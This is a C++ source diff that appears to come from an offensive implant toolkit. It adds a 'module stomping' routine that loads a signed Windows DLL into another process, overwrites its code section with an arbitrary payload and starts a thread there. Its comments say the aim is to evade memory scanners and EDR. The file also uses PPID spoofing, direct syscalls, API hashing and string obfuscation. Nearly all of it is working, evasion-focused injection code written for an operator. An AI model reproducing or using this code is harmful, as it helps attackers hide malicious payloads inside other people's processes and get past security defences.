@@ -2,6 +2,8 @@
 // SpawnWithPPID: PPID spoofing via extended startup info attribute.
 // InjectRemoteProcess: full NtOpenProcess → NtAllocateVirtualMemory →
 //   NtWriteVirtualMemory → NtProtectVirtualMemory → NtCreateThreadEx chain.
+// InjectModuleStomp: load a signed System32 DLL into the target and run the
+//   payload out of its .text, so the code is image-backed rather than private RX.
 #include "injection.hpp"
 #include "syscalls.hpp"
 #include "obfuscate.hpp"
@@ -295,6 +297,229 @@ BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize) {
     if (!queued) FreeTarget(hProc, base);
     CloseTarget(hProc);
     return queued;
+}
+
+// ============================================================
+// Module stomping
+// ============================================================
+// Load a legitimate signed DLL into the target, overwrite its .text with the
+// payload, and start a thread at the module base. The payload then lives in an
+// image-backed section of a Microsoft binary instead of a private RX
+// allocation - the artifact most memory scanners key on. The write dirties
+// copy-on-write pages in the target only: the file on disk and every other
+// process mapping it stay untouched. The host module is not restored, so the
+// operator must pick a DLL the target does not need afterwards.
+namespace {
+
+struct TextSection {
+    DWORD rva  = 0;
+    DWORD size = 0;
+};
+
+bool ReadFileBytes(const wchar_t* path, std::vector<BYTE>& out) {
+    HANDLE h = CreateFileW(path, GENERIC_READ,
+                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (h == INVALID_HANDLE_VALUE) return false;
+
+    LARGE_INTEGER sz = {};
+    bool ok = GetFileSizeEx(h, &sz) && sz.QuadPart > 0x1000 &&
+              sz.QuadPart < 64 * 1024 * 1024;
+    if (ok) {
+        out.resize(static_cast<size_t>(sz.QuadPart));
+        DWORD read = 0;
+        ok = ReadFile(h, out.data(), static_cast<DWORD>(out.size()), &read, nullptr) &&
+             read == out.size();
+    }
+    CloseHandle(h);
+    return ok;
+}
+
+// .text geometry from the on-disk image — the same ground truth an EDR
+// compares the in-memory section against.
+bool FindTextSection(const std::vector<BYTE>& image, TextSection& out) {
+    if (image.size() < sizeof(IMAGE_DOS_HEADER)) return false;
+    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(image.data());
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
+    if (static_cast<size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS64) > image.size())
+        return false;
+
+    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(image.data() + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
+    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return false;
+
+    auto* secs = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
+        if (memcmp(secs[i].Name, ".text", 5) == 0) {
+            out.rva  = secs[i].VirtualAddress;
+            out.size = secs[i].Misc.VirtualSize > secs[i].SizeOfRawData
+                           ? secs[i].Misc.VirtualSize
+                           : secs[i].SizeOfRawData;
+            return out.size > 0;
+        }
+    }
+    return false;
+}
+
+// Base address of a named module inside the target process.
+PVOID RemoteModuleBase(DWORD pid, const wchar_t* moduleName) {
+    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
+    if (!hKernel32 || !moduleName) return nullptr;
+
+    auto _Snap        = HASHPROC(hKernel32, CreateToolhelp32Snapshot);
+    auto _ModFirst    = HASHPROC(hKernel32, Module32FirstW);
+    auto _ModNext     = HASHPROC(hKernel32, Module32NextW);
+    auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);
+    if (!_Snap || !_ModFirst || !_ModNext || !_CloseHandle) return nullptr;
+
+    HANDLE snap = _Snap(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
+    if (snap == INVALID_HANDLE_VALUE) return nullptr;
+
+    MODULEENTRY32W me = {};
+    me.dwSize = sizeof(me);
+    PVOID base = nullptr;
+    if (_ModFirst(snap, &me)) {
+        do {
+            if (_wcsicmp(me.szModule, moduleName) == 0) { base = me.modBaseAddr; break; }
+        } while (_ModNext(snap, &me));
+    }
+    _CloseHandle(snap);
+    return base;
+}
+
+bool AllocRemote(HANDLE hProc, SIZE_T size, PVOID& base) {
+    base = nullptr;
+    SIZE_T region = size;
+    if (g_Syscalls.NtAllocateVirtualMemory) {
+        return g_Syscalls.NtAllocateVirtualMemory(hProc, &base, 0, &region,
+                                                  MEM_COMMIT | MEM_RESERVE,
+                                                  PAGE_READWRITE) == 0;
+    }
+    base = VirtualAllocEx(hProc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    return base != nullptr;
+}
+
+bool WriteRemote(HANDLE hProc, PVOID dst, const void* src, SIZE_T size) {
+    SIZE_T written = 0;
+    if (g_Syscalls.NtWriteVirtualMemory) {
+        return g_Syscalls.NtWriteVirtualMemory(hProc, dst, const_cast<void*>(src), size,
+                                               &written) == 0 && written == size;
+    }
+    return WriteProcessMemory(hProc, dst, src, size, &written) && written == size;
+}
+
+bool ProtectRemote(HANDLE hProc, PVOID addr, SIZE_T size, DWORD prot) {
+    if (g_Syscalls.NtProtectVirtualMemory) {
+        PVOID base = addr;
+        SIZE_T region = size;
+        ULONG oldProt = 0;
+        return g_Syscalls.NtProtectVirtualMemory(hProc, &base, &region, prot,
+                                                 &oldProt) == 0;
+    }
+    DWORD oldProt = 0;
+    return VirtualProtectEx(hProc, addr, size, prot, &oldProt) != 0;
+}
+
+// CreateRemoteThreadFallback passes no argument; LoadLibraryW needs the remote
+// path string, so this variant takes one.
+HANDLE CreateRemoteThreadParam(HANDLE hProc, PVOID startAddr, PVOID param) {
+    if (g_Syscalls.NtCreateThreadEx) {
+        HANDLE hThread = nullptr;
+        g_Syscalls.NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, hProc,
+                                    startAddr, param, 0, 0, 0, 0, nullptr);
+        return hThread;
+    }
+    return CreateRemoteThread(hProc, nullptr, 0,
+                              reinterpret_cast<LPTHREAD_START_ROUTINE>(startAddr),
+                              param, 0, nullptr);
+}
+
+} // namespace
+
+BOOL InjectModuleStomp(DWORD pid, const BYTE* payload, SIZE_T payloadSize,
+                       const wchar_t* hostDll, HANDLE* hThreadOut) {
+    if (!payload || payloadSize == 0 || !hostDll) return FALSE;
+
+    std::vector<BYTE> hostImage;
+    TextSection text;
+    if (!ReadFileBytes(hostDll, hostImage) || !FindTextSection(hostImage, text))
+        return FALSE;
+    if (payloadSize > text.size) return FALSE;
+
+    // Accept either separator: operators type '\', scripts and tests often pass
+    // '/', and every Win32 file API takes both.
+    wchar_t dllName[MAX_PATH] = {};
+    {
+        const wchar_t* slash  = wcsrchr(hostDll, L'\\');
+        const wchar_t* fslash = wcsrchr(hostDll, L'/');
+        const wchar_t* cut = (!slash || (fslash && fslash > slash)) ? fslash : slash;
+        wcsncpy_s(dllName, cut ? cut + 1 : hostDll, _TRUNCATE);
+    }
+
+    HANDLE hProc = OpenTarget(pid,
+        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD);
+    if (!hProc) return FALSE;
+
+    // 1. Stage the DLL path inside the target and have the target load it.
+    SIZE_T pathBytes = (wcslen(hostDll) + 1) * sizeof(wchar_t);
+    PVOID remotePath = nullptr;
+    if (!AllocRemote(hProc, pathBytes, remotePath) ||
+        !WriteRemote(hProc, remotePath, hostDll, pathBytes)) {
+        if (remotePath) FreeTarget(hProc, remotePath);
+        CloseTarget(hProc);
+        return FALSE;
+    }
+
+    // LoadLibraryW's offset inside its own module is identical in every process
+    // running the same kernel32, so resolve the RVA locally and apply it to the
+    // target's kernel32 base.
+    HMODULE hLocalK32 = GetModuleHandleA(XS("kernel32.dll"));
+    FARPROC pLoadLibraryW = hLocalK32 ? HashProc(hLocalK32, FNV("LoadLibraryW")) : nullptr;
+    auto k32Name = XSW(L"kernel32.dll");
+    PVOID k32TargetBase = RemoteModuleBase(pid, k32Name.str());
+    if (!hLocalK32 || !pLoadLibraryW || !k32TargetBase) {
+        FreeTarget(hProc, remotePath);
+        CloseTarget(hProc);
+        return FALSE;
+    }
+    PVOID remoteLoadLibraryW = reinterpret_cast<BYTE*>(k32TargetBase) +
+        (reinterpret_cast<BYTE*>(pLoadLibraryW) - reinterpret_cast<BYTE*>(hLocalK32));
+
+    HANDLE hLoad = CreateRemoteThreadParam(hProc, remoteLoadLibraryW, remotePath);
+    if (!hLoad) {
+        FreeTarget(hProc, remotePath);
+        CloseTarget(hProc);
+        return FALSE;
+    }
+    WaitForSingleObject(hLoad, 10000);
+    CloseTarget(hLoad);
+    FreeTarget(hProc, remotePath);   // LoadLibrary consumed the string
+
+    // 2. Re-enumerate for the base instead of trusting the thread's exit code:
+    //    when the DLL was already loaded, LoadLibrary only bumps a refcount.
+    PVOID moduleBase = RemoteModuleBase(pid, dllName);
+    if (!moduleBase) { CloseTarget(hProc); return FALSE; }
+
+    // 3. Stomp .text: RW -> write -> RX. Copy-on-write confines the change to
+    //    the target process; disk and other processes are untouched.
+    PVOID textAddr = reinterpret_cast<BYTE*>(moduleBase) + text.rva;
+    if (!ProtectRemote(hProc, textAddr, payloadSize, PAGE_EXECUTE_READWRITE) ||
+        !WriteRemote(hProc, textAddr, payload, payloadSize) ||
+        !ProtectRemote(hProc, textAddr, payloadSize, PAGE_EXECUTE_READ)) {
+        CloseTarget(hProc);
+        return FALSE;
+    }
+
+    // 4. Execute from inside the module: image-backed, inside a signed
+    //    module's address range.
+    HANDLE hThread = CreateRemoteThreadParam(hProc, textAddr, nullptr);
+    if (!hThread) { CloseTarget(hProc); return FALSE; }
+
+    if (hThreadOut) *hThreadOut = hThread;
+    else            CloseTarget(hThread);
+
+    CloseTarget(hProc);
+    return TRUE;
 }
 
 // ============================================================
